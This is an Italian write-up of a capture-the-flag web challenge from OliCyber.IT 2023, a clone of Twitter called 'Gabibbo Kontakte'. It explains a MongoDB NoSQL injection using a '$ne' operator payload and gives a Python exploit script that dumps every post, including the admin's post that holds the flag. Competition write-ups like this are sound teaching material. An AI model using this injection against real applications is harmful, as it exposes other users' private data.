# OliCyber.IT 2023 - Simulazione training camp 3

## [web] Gabibbo Kontakte (10 risoluzioni)

L'applicativo si presenta come un piccolo clone di twitter, possiamo quindi registrarci, eseguire il login e pubblicare dei piccoli tweet.

Possiamo inoltre cercare un utente, questa funzionalità ci fa andare sul profilo di questo utente e ci fa vedere lo storico dei suoi tweet.

Tuttavia se andiamo sul profilo dell'utente `admin` ci viene detto che non esiste, proprio come ci anticipa la descrizione della challenge.

### Soluzione

La superficie di attacco di questa applicazione non è molto ampia, abbiamo infatti giusto un paio di form che possiamo usare.

Una cosa da notare però, importante per capire l'architettura è cosa succede quando vediamo i tweet, che siano nostri o di un altro profilo.

Nella console ci vengono stampati i dati che poi verranno renderizzati, ci salta all'occhio la struttura dell'oggetto in questione:

```json
{
  "_id": "63c91e0c379054d19d222698",
  "username": "asd",
  "content": "asd"
}
```

Abbiamo infatti una proprietà `_id` molto caratteristica, si tratta infatti di un ID tipico dei database MongoDB, proviamo dunque i payload generici delle NoSQL injection:

```json
{
  "username": {
    "$ne": ""
  }
}
```

ed in questo modo otteniamo tutti i tweet, compresi quelli dell'admin, che contiene la nostra flag.

### Exploit

```python
#!/bin/python3

import requests
import random
import string


def random_string(k=10):
    return ''.join(random.choices(string.ascii_letters, k=k))

data = {
    'username': random_string(k=20),
    'password': random_string(k=20)
}

base_url = 'http://gabibbo_kontakte.challs.olicyber.it'

# Register
s = requests.Session()

r = s.post(f'{base_url}/register', json=data)

r = s.post(f'{base_url}/api/posts', json={
    'username':{
        '$ne':''
    }
})

for x in r.json():
    if x['username'] == 'admin':
        print(x['content'])
```
